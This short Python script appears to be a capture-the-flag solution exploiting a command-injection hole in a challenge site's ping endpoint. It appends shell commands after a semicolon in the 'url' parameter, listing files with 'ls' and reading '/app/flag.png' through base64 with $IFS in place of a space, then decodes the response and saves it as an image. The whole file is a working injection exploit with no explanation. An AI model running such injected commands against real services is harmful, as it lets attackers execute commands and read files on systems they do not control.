import requests as req
import base64

url = "https://challenges.isictf.live:1416//ping?url="
command1="https://github.com/;ls"
command2="https://github.com/;base64$IFS/app/flag.png"
resp = req.get(url+command2)

decoded_bytes = base64.b64decode(resp.text)
file_path = 'image.png'  
with open(file_path, 'wb') as file:
    file.write(decoded_bytes)

